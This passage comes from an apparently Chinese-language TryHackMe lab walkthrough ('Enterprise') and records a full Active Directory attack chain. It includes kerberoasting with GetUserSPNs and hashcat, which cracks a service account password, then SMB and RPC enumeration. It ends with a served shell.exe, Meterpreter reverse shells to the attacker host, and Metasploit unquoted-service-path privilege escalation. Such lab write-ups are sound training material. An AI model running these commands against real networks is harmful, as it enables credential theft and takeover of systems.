class="variable">$16fc2d0bf83bca6a3c85ec1360c5de1566d4e03a0a5c8ac008eee9f9c2447b38c5ed1aebe167eefdb3c9a8ca752ee191b497c1603579495a9842b29dcb6721799d7452274adca18ccdb2e43a1af0dda19ecc300bfcaa123da5a3013d34037c988622a963c29935718902ac24de4807abb9aebf47d6b63b01360e48c1f679a3a4aa5e16805ecdea88db6819617b4792db2ec2481d8710736be8aa64fd8568c1fb51c06588c9fd8c701aac8dccdd8e99b9e3172cb92573801c20068ab16f784135d22c905075c6c5b1eea6056093443c50b4833d0b56d39b0f58ab3bc52b91f222e04dfc1d25633e5a7000009c4ccf0593dc3b011b6e0a1e992724849cceb290325a79bad2a16dc6e0b64ec4074f5a566c02ce4990214730637b843bd988561bf549c6362f96b43c2d9653aab319f59450b2c1c847b6e44bb6445cb5b0a07cedbc09ae427481094f2372f437017fdc7b9042ab69a41c1fea265143669017ccc10733b8493d8898bbf6fbab4bdca0f007c7134425c2cef5eda1b896a4ae9d1ecb8ed82c903df6152b85650a24e2202d55498fd319c5e2c1a6f018667400d12bd881298193f17ef2228d00023740073f3fbb74e998c96ec93144402c9fc8711323d2f0368530a83da26cc431ffb3c36749e207347e996617c8de3e5752d013b038412b99a83388da88cc719e67fe719c1b74de4dd7b6b3de76cb5350ec262880bf770c8005e6b4041632c178f4ac7e299206fab6c03afeec11a0408323fcdf5f7912e8fb6b08d9b27e2f6ce2b92a21bd5fd683f72aa8c0e290e53a3ede5782544ffa382615beeab7b90ad275abf9955652b100564a2fa6dfb4bdde5cfb387eff368c27a79bddbe3345d2dcd770c59a0142952fd8414c02f54400c69fdc1d0ee2642273226df07a0429721d266d273c0c172116891935640237d2e2ba91e764aec16f812f3198c01f5646e094c3f41846b39b37e4baa8468160cfa2becd5669f616d0cf247bf1cada86d14a6b4ca0f3e8697c3f9b720e160a7be627846ab0de41d4cbf82d7220d001ffb377a8676aff35a9b8747d619ad7c1258f0c163e9cdccabaaf98ea5436b2e2ca72ab6936d003373d2742d46d0306c1148ccf6a3048bfb60a6e9eadacd2408d74c0162d050e2249d23130c21880c56e188ff6811e3b5e3b012d8ca6ee0f5cb4d8fd7770a7125a98295e2eed1ac41b9eb2cd84cc3feeaeb4a34260726b3772e3db8f6cbfaf802c80394a63edb32714427f4f6fb25badee1007e619e7fcec4ad1a61e1f85d0568214f5c1263f4d739e0fa784fc7096d20e2bfd0954fe04cb44ab8a1ea13c07ea7dc85c4817a8f230eebac933215d27fd05b095729224f5</span></span><br><span class="line"></span><br><span class="line">$ hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 13715/13779 MB (4096 MB allocatable), 8MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Using pure kernels enables cracking longer passwords but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized backend kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 204 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*bitbucket<span class="variable">$LAB</span>.ENTERPRISE.THM<span class="variable">$LAB</span>.ENTERPRISE.THM/bitbucket*$bc046c4c066ff99b622d84378a594dad<span class="variable">$16fc2d0bf83bca6a3c85ec1360c5de1566d4e03a0a5c8ac008eee9f9c2447b38c5ed1aebe167eefdb3c9a8ca752ee191b497c1603579495a9842b29dcb6721799d7452274adca18ccdb2e43a1af0dda19ecc300bfcaa123da5a3013d34037c988622a963c29935718902ac24de4807abb9aebf47d6b63b01360e48c1f679a3a4aa5e16805ecdea88db6819617b4792db2ec2481d8710736be8aa64fd8568c1fb51c06588c9fd8c701aac8dccdd8e99b9e3172cb92573801c20068ab16f784135d22c905075c6c5b1eea6056093443c50b4833d0b56d39b0f58ab3bc52b91f222e04dfc1d25633e5a7000009c4ccf0593dc3b011b6e0a1e992724849cceb290325a79bad2a16dc6e0b64ec4074f5a566c02ce4990214730637b843bd988561bf549c6362f96b43c2d9653aab319f59450b2c1c847b6e44bb6445cb5b0a07cedbc09ae427481094f2372f437017fdc7b9042ab69a41c1fea265143669017ccc10733b8493d8898bbf6fbab4bdca0f007c7134425c2cef5eda1b896a4ae9d1ecb8ed82c903df6152b85650a24e2202d55498fd319c5e2c1a6f018667400d12bd881298193f17ef2228d00023740073f3fbb74e998c96ec93144402c9fc8711323d2f0368530a83da26cc431ffb3c36749e207347e996617c8de3e5752d013b038412b99a83388da88cc719e67fe719c1b74de4dd7b6b3de76cb5350ec262880bf770c8005e6b4041632c178f4ac7e299206fab6c03afeec11a0408323fcdf5f7912e8fb6b08d9b27e2f6ce2b92a21bd5fd683f72aa8c0e290e53a3ede5782544ffa382615beeab7b90ad275abf9955652b100564a2fa6dfb4bdde5cfb387eff368c27a79bddbe3345d2dcd770c59a0142952fd8414c02f54400c69fdc1d0ee2642273226df07a0429721d266d273c0c172116891935640237d2e2ba91e764aec16f812f3198c01f5646e094c3f41846b39b37e4baa8468160cfa2becd5669f616d0cf247bf1cada86d14a6b4ca0f3e8697c3f9b720e160a7be627846ab0de41d4cbf82d7220d001ffb377a8676aff35a9b8747d619ad7c1258f0c163e9cdccabaaf98ea5436b2e2ca72ab6936d003373d2742d46d0306c1148ccf6a3048bfb60a6e9eadacd2408d74c0162d050e2249d23130c21880c56e188ff6811e3b5e3b012d8ca6ee0f5cb4d8fd7770a7125a98295e2eed1ac41b9eb2cd84cc3feeaeb4a34260726b3772e3db8f6cbfaf802c80394a63edb32714427f4f6fb25badee1007e619e7fcec4ad1a61e1f85d0568214f5c1263f4d739e0fa784fc7096d20e2bfd0954fe04cb44ab8a1ea13c07ea7dc85c4817a8f230eebac933215d27fd05b095729224f5</span>:littleredbucket</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitbucket：littleredbucket</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //10.10.251.132/Users -U bitbucket</span><br><span class="line">Enter WORKGROUP\bitbucket<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; </span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                  DR        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  ..                                 DR        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Administrator                       D        0  Fri Mar 12 05:55:48 2021</span></span><br><span class="line"><span class="string">  All Users                       DHSrn        0  Sat Sep 15 15:28:48 2018</span></span><br><span class="line"><span class="string">  atlbitbucket                        D        0  Fri Mar 12 06:53:06 2021</span></span><br><span class="line"><span class="string">  bitbucket                           D        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Default                           DHR        0  Fri Mar 12 08:18:03 2021</span></span><br><span class="line"><span class="string">  Default User                    DHSrn        0  Sat Sep 15 15:28:48 2018</span></span><br><span class="line"><span class="string">  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018</span></span><br><span class="line"><span class="string">  LAB-ADMIN                           D        0  Fri Mar 12 08:28:14 2021</span></span><br><span class="line"><span class="string">  Public                             DR        0  Fri Mar 12 05:27:02 2021</span></span><br><span class="line"><span class="string">cd </span></span><br><span class="line"><span class="string">		15587583 blocks of size 4096. 9927505 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; cd bitbucket\</span></span><br><span class="line"><span class="string">smb: \bitbucket\&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  3D Objects                         DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  AppData                            DH        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Application Data                DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Contacts                           DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Cookies                         DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Desktop                            DR        0  Mon Mar 15 10:49:48 2021</span></span><br><span class="line"><span class="string">  Documents                          DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Downloads                          DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Favorites                          DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Links                              DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Local Settings                  DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Music                              DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  My Documents                    DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  NetHood                         DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  NTUSER.DAT                        AHn   786432  Tue Jul 12 14:27:45 2022</span></span><br><span class="line"><span class="string">  ntuser.dat.LOG1                   AHS        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  ntuser.dat.LOG2                   AHS   209920  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TM.blf    AHS    65536  Fri Mar 12 10:15:15 2021</span></span><br><span class="line"><span class="string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  ntuser.ini                         HS       20  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Pictures                           DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  PrintHood                       DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Recent                          DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Saved Games                        DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  Searches                           DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  SendTo                          DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Start Menu                      DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Templates                       DHSrn        0  Fri Mar 12 10:11:49 2021</span></span><br><span class="line"><span class="string">  Videos                             DR        0  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		15587583 blocks of size 4096. 9927505 blocks available</span></span><br><span class="line"><span class="string">smb: \bitbucket\&gt; cd Desktop\</span></span><br><span class="line"><span class="string">smb: \bitbucket\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                  DR        0  Mon Mar 15 10:49:48 2021</span></span><br><span class="line"><span class="string">  ..                                 DR        0  Mon Mar 15 10:49:48 2021</span></span><br><span class="line"><span class="string">  desktop.ini                       AHS      282  Fri Mar 12 10:11:51 2021</span></span><br><span class="line"><span class="string">  user.txt                            A       37  Mon Mar 15 10:49:51 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		15587583 blocks of size 4096. 9927505 blocks available</span></span><br><span class="line"><span class="string">smb: \bitbucket\Desktop\&gt; get user.txt</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>还是无法登录winrm：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [*] Windows 10.0 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)</span><br><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [*] http://10.10.251.132:5985/wsman</span><br><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\bitbucket:littleredbucket</span><br></pre></td></tr></table></figure>
+
+<p>可以连RPC去查询一下域内信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient 10.10.251.132 -U bitbucket</span><br><span class="line">Enter WORKGROUP\bitbucket&#x27;s password:</span><br><span class="line">rpcclient $&gt; enumdomusers </span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[atlbitbucket] rid:[0x3e8]</span><br><span class="line">user:[bitbucket] rid:[0x452]</span><br><span class="line">user:[nik] rid:[0x453]</span><br><span class="line">user:[replication] rid:[0x454]</span><br><span class="line">user:[spooks] rid:[0x455]</span><br><span class="line">user:[korone] rid:[0x456]</span><br><span class="line">user:[banana] rid:[0x457]</span><br><span class="line">user:[Cake] rid:[0x458]</span><br><span class="line">user:[contractor-temp] rid:[0x45c]</span><br><span class="line">user:[varg] rid:[0x45d]</span><br><span class="line">user:[joiner] rid:[0x45f]</span><br><span class="line">rpcclient $&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只是一个普通域用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser bitbucket</span><br><span class="line">	User Name   :	bitbucket</span><br><span class="line">	Full Name   :	BitBucket</span><br><span class="line">	Home Drive  :	</span><br><span class="line">	Dir Drive   :	</span><br><span class="line">	Profile Path:	</span><br><span class="line">	Logon Script:	</span><br><span class="line">	Description :	</span><br><span class="line">	Workstations:	</span><br><span class="line">	Comment     :	</span><br><span class="line">	Remote Dial :</span><br><span class="line">	Logon Time               :	一, 26 4月 2021 23:16:42 CST</span><br><span class="line">	Logoff Time              :	四, 01 1月 1970 08:00:00 CST</span><br><span class="line">	Kickoff Time             :	四, 14 9月 30828 10:48:05 CST</span><br><span class="line">	Password last <span class="built_in">set</span> Time   :	五, 12 3月 2021 09:20:01 CST</span><br><span class="line">	Password can change Time :	六, 13 3月 2021 09:20:01 CST</span><br><span class="line">	Password must change Time:	四, 14 9月 30828 10:48:05 CST</span><br><span class="line">	unknown_2[0..31]...</span><br><span class="line">	user_rid :	0x452</span><br><span class="line">	group_rid:	0x201</span><br><span class="line">	acb_info :	0x00000210</span><br><span class="line">	fields_present:	0x00ffffff</span><br><span class="line">	logon_divs:	168</span><br><span class="line">	bad_password_count:	0x00000000</span><br><span class="line">	logon_count:	0x0000001b</span><br><span class="line">	padding1[0..7]...</span><br><span class="line">	logon_hrs[0..21]...</span><br><span class="line">rpcclient $&gt; querygroup 0x201</span><br><span class="line">	Group Name:	Domain Users</span><br><span class="line">	Description:	All domain <span class="built_in">users</span></span><br><span class="line">	Group Attribute:7</span><br><span class="line">	Num Members:14</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.251.132 <span class="string">&#x27;LAB.ENTERPRISE.THM/bitbucket:littleredbucket&#x27;</span></span><br><span class="line">Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br></pre></td></tr></table></figure>
+
+<p>就这一个账号。RDP可以登录。远程登录上去并没有发现微软安全中心。</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712163932959.png" srcset="/img/loading.gif" lazyload alt="image-20220712163932959"></p>
+<p>它自己就是关闭的，可以直接利用msf提权模块了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python -m http.server 80</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.160.208 - - [12/Jul/2022 16:44:43] <span class="string">&quot;GET /shell.exe HTTP/1.1&quot;</span> 200</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 10.11.75.230:4444 </span><br><span class="line">[*] Sending stage (200774 bytes) to 10.10.160.208</span><br><span class="line">[*] Meterpreter session 1 opened (10.11.75.230:4444 -&gt; 10.10.160.208:50253) at 2022-07-12 16:45:00 +0800</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Users\bitbucket) backgroud</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; <span class="built_in">set</span> LHOST 10.11.75.230</span><br><span class="line">LHOST =&gt; 10.11.75.230</span><br><span class="line">[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; <span class="built_in">set</span> session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.11.75.230:4444 </span><br><span class="line">[*] Finding a vulnerable service...</span><br><span class="line">[*] Attempting exploitation of zerotieroneservice</span><br><span class="line">[*] Placing C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe <span class="keyword">for</span> zerotieroneservice</span><br><span class="line">[*] Attempting to write 15872 bytes to C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe...</span><br><span class="line">[+] Manual cleanup of C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe is required due to a potential reboot <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] Successfully wrote payload</span><br><span class="line">[*] Launching service zerotieroneservice...</span><br><span class="line">[*] Manual cleanup of the payload file is required. zerotieroneservice will fail to start as long as the payload remains on disk.</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.10.160.208</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.10.160.208</span><br><span class="line">[*] Meterpreter session 3 opened (10.11.75.230:4444 -&gt; 10.10.160.208:50604) at 2022-07-12 17:06:13 +0800</span><br><span class="line"></span><br><span class="line">(Meterpreter 3)(C:\Windows\system32) &gt; <span class="built_in">cd</span> /</span><br><span class="line">(Meterpreter 3)(C:\) &gt; <span class="built_in">ls</span></span><br><span class="line">Listing: C:\</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 10:11:53 +0800  <span class="variable">$Recycle</span>.Bin</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-13 10:02:21 +0800  Atlassian</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 08:18:03 +0800  Documents and Settings</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 09:39:01 +0800  PerfLogs</span><br><span class="line">040555/r-xr-xr-x  4096   <span class="built_in">dir</span>   2021-03-15 14:44:23 +0800  Program Files</span><br><span class="line">040777/rwxrwxrwx  4096   <span class="built_in">dir</span>   2021-03-15 08:36:25 +0800  Program Files (x86)</span><br><span class="line">040777/rwxrwxrwx  4096   <span class="built_in">dir</span>   2021-03-15 14:44:20 +0800  ProgramData</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 08:18:05 +0800  Recovery</span><br><span class="line">040777/rwxrwxrwx  4096   <span class="built_in">dir</span>   2021-03-12 05:31:22 +0800  System Volume Information</span><br><span class="line">040555/r-xr-xr-x  4096   <span class="built_in">dir</span>   2021-03-12 10:11:49 +0800  Users</span><br><span class="line">040777/rwxrwxrwx  16384  <span class="built_in">dir</span>   2021-03-15 14:53:04 +0800  Windows</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-15 10:47:35 +0800  WorkShare</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 05:31:19 +0800  inetpub</span><br><span class="line">040777/rwxrwxrwx  0      <span class="built_in">dir</span>   2021-03-12 06:52:52 +0800  logs</span><br><span class="line">000000/---------  0      fif   1970-01-01 08:00:00 +0800  pagefile.sys</span><br><span class="line"></span><br><span class="line">(Meterpreter 3)(C:\) &gt; <span class="built_in">cd</span> Users\\Administrator\\Desktop\\</span><br><span class="line">(Meterpreter 3)(C:\Users\Administrator\Desktop) &gt; <span class="built_in">ls</span></span><br><span class="line">Listing: C:\Users\Administrator\Desktop</span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  282   fil   2021-03-12 09:47:55 +0800  desktop.ini</span><br><span class="line">100666/rw-rw-rw-  37    fil   2021-03-15 10:49:34 +0800  root.txt</span><br><span class="line"></span><br><span class="line">(Meterpreter 3)(C:\Users\Administrator\Desktop) &gt; <span class="built_in">cat</span> root.txt </span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe Walkthrough - Enterprise</div>
+      <div>https://crazyinside.github.io/post/TryHackMe-Enterprise.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/TryHackMe-Juicy-Details.html" title="TryHackMe Walkthrough - Juicy Details">
+                        <i class="iconfont icon-arrowleft"></i>
